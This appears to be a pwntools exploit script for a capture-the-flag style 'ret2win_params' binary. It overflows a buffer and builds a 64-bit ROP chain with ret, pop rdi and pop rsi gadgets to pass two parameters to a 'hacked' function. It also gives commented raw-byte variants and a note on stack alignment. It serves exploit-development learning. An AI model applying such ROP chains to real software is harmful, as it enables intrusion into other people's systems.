#!/usr/bin/env python3

from pwn import *

exe = './ret2win_params'

elf = context.binary = ELF(exe,checksec=False)

context.log_level = 'debug'

io = process(exe)

padding = 24

hacked = 0x0000000000401142
pop_rdi = 0x000000000040124b
pop_rsi = 0x0000000000401249
param1 = 0xdeadbeefdeadbeef
param2 = 0xc0debabec0debabe
ret = 0x0000000000401016

#junk = asm('nop') * 16 # nop = \x90 = 1 byte, 64 bit registers so can take 16 hex 
junk = 0x0 # will put remaining 0 since context.binary tells it the file if 64 bit


#0x0000000000401249: pop rsi; pop r15; ret;
#pop rsi comes with pop r15 so need to provide junk data for that register too

payload = flat(
	asm('nop') * padding,
	ret,
	pop_rdi,
	param1,
	pop_rsi,
	param2,
	junk,
    elf.symbols.hacked,
)

io.sendlineafter(b':',payload)

io.interactive()

#A small issue you may get when pwning on 64-bit systems is that your exploit works perfectly locally but fails remotely - or even fails when you try to use the provided LIBC version rather than your local one. This arises due to something called stack alignment

#if the stack is not 16-byte aligned - that is, RSP is not a multiple of 16 - the ROP chain will fail on systems

#The fix is simple - in your ROP chain, before the call to system, place a singular ret gadget







#from pwn import *

#context.log_level = 'debug'

#io = process('./ret2win_params')

#io.sendlineafter( b':\n' , b'A' * 24  + b'\x4b\x12\x40\x00\x00\x00\x00\x00' + b'\xef\xbe\xad\xde\xef\xbe\xad\xde' + b'\x49\x12\x40\x00\x00\x00\x00\x00' + b'\xbe\xba\xde\xc0\xbe\xba\xde\xc0' + b'\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x42\x11\x40\x00\x00\x00\x00\x00')

#io.sendlineafter(b':\n', b'A' *24 + p64(0x000000000040124b) + p64(0xdeadbeefdeadbeef) + p64(0x0000000000401249) + p64(0xc0debabec0debabe) + p64(0x0000000000000000) + p64(0x0000000000401142)  )

#io.interactive()

#print(io.recvall().decode('latin-1'))


# 64 bit machine so 64 bit address = 16 hex
